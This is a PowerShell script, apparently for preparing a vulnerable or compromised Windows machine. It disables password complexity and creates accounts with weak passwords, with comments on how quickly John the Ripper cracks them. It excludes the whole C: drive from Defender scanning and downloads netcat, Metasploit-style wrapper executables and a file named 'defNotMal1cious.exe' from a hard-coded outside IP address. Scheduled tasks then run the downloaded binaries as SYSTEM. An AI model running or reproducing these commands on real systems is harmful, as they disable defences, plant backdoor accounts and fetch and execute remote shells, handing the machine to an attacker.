secedit /export /cfg c:\secpol.cfg
(gc C:\secpol.cfg).replace("PasswordComplexity = 1", "PasswordComplexity = 0") | Out-File C:\secpol.cfg
secedit /configure /db c:\windows\security\local.sdb /cfg c:\secpol.cfg /areas SECURITYPOLICY
rm -force c:\secpol.cfg -confirm:$false
net user julie Juliet /ADD #Takes a few seconds with "john --wordlist=/usr/share/john/password.lst --rules:All hash.txt" *OR*
#Takes about a minute with "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
net user julie prettywoman /ADD # 1,000 lines into rockyou
net user yvonne hallowell /ADD # - end of password.lst
net user joshua Nabdawr23 /ADD # - ?u?l?l?l?l?l?l?d?d
Add-MpPreference -ExclusionPath "C:\";
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFile C:/nc.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMal1cious.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperMSF.exe -OutFile C:/windowsWrapperMSF.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.exe -OutFile C:/windowsWrapperNC.exe;
$startTime = (get-date).AddMinutes(1).ToString("HH:mm")
$Action1=New-ScheduledTaskAction -Execute 'Powershell.exe' -WorkingDirectory 'C:/' -Argument '.\windowsWrapperNC.exe';
$Trigger=New-ScheduledTaskTrigger -Once -At $startTime
Register-ScheduledTask -TaskName "windowsNC" -Action $Action1 -Trigger $Trigger -RunLevel Highest -User 'NT AUTHORITY\SYSTEM';
Start-ScheduledTask -TaskName "windowsNC" -AsJob
$startTime = (get-date).AddMinutes(1).ToString("HH:mm")
$Action1=New-ScheduledTaskAction -Execute 'Powershell.exe' -WorkingDirectory 'C:/' -Argument '.\windowsWrapperMSF.exe';
$Trigger=New-ScheduledTaskTrigger -Once -At $startTime
Register-ScheduledTask -TaskName "windowsMSF" -Action $Action1 -Trigger $Trigger -RunLevel Highest -User 'NT AUTHORITY\SYSTEM';
Start-ScheduledTask -TaskName "windowsMSF" -AsJob
